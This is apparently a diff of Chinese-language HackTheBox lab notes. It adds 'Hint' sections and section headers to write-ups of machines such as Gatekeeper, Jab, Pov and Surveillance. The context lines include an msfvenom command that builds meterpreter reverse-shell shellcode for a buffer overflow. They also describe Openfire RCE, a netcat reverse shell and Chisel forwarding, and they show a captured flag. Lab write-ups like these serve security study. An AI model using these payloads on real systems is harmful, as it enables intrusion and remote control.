@@ -12,6 +12,7 @@
 ![[Pasted image 20240310205840.png]]
 可以看到Share文件夹下的gatekeeper.exe文件
 get下载下来(使用binary二进制模式下载，不然运行会出问题)
+## Analysis
 放到windows系统下运行：
 ![[Pasted image 20240310210224.png]]
 显示等待连接，上面扫描到的31337可能就是运行了此程序
@@ -67,6 +68,7 @@ Results后跟的地址就是我们所需的JMP
 `msfvenom -p windows/meterpreter/reverse_tcp -f c -b "\x00\x0a" LHOST=攻击机IP LPORT=攻击机端口`
 ![[Pasted image 20240310220236.png]]
 ![[Pasted image 20240310220310.png]]
+## Getshell
 发送Payload前准备好meterpreter接收器监听
 ![[Pasted image 20240310220435.png]]
 将上面的shellcode作为脚本的payload进行发送：
@@ -93,6 +95,8 @@ clone解密脚本：
 ![[Pasted image 20240310223757.png]]
 在桌面拿到root.txt
 `{Th3_M4y0r_C0ngr4tul4t3s_U}`
+## Hint
+Immunity Debugger以及mona插件的使用和缓冲区溢出利用
 # [HTB] Jab #DCOM #AS-REP
 - **初始侦察**：使用**nmap**扫描发现开放端口88、445和5222。
 - **SMB尝试**：尝试使用**smbclient**和**crackmapexec**检查共享文件夹，但遇到错误。
@@ -105,6 +109,8 @@ clone解密脚本：
 - **漏洞利用**：利用CVE-2023–32315漏洞，通过上传恶意**.jar**文件到Openfire admin console实现远程代码执行（RCE）。
 - **端口转发**：使用**Chisel**设置端口转发以访问本地端口9090和9091。***\*Chisel的使用***
 - **获取根权限**：通过Openfire admin console的RCE获取系统（root）权限，并查看root.txt文件。
+## Hint
+NP标志位的设置以及利用，DCOM组件的利用
 # [HTB] Pov #\.Net反序列化
 ```Credential
 alaading
@@ -261,6 +267,8 @@ type C:\Users\Administrator\Desktop\root.txt
 ```
 
 我们已获得管理员标志。
+## Hint
+__ViewState的反序列化及利用，Powershell本地凭证的提取，使用RunasCS利用明文密码进行runas操作，使用脚本启用所有拥有的权限
 # [HTB] Surveillance
 ## Lab Info
 
@@ -345,7 +353,7 @@ Curiosity set in and I decided to research zoneminder, only to found that it is 
 好奇心驱使我，决定研究 zoneminder，结果发现它是一个可以提供完整监控系统电路的 API。
 
 I found it running locally and for me to be able to visit it on my machine browser, i had to port forward.  
-我发现它在本地运行，为了让我能够在我的机器浏览器上访问它，我必须向前移植。
+我发现它在本地运行，为了让我能够在我的机器浏览器上访问它，我必须端口转发。
 
 ![](https://miro.medium.com/v2/resize:fit:700/1*QfET2opJRCHMYw8u0yFecg.png)
 
@@ -397,6 +405,7 @@ So I decided to use busybox to make use of netcat to give me a reverse shell fro
 所以我决定使用 busybox 来利用 netcat 给我一个来自 root 的反向 shell。
 
 ![](https://miro.medium.com/v2/resize:fit:700/0*_g362aYEoB52iYy4)
+## Hint
 
 # [HTB] headless #XSS 
 ## Enumeration
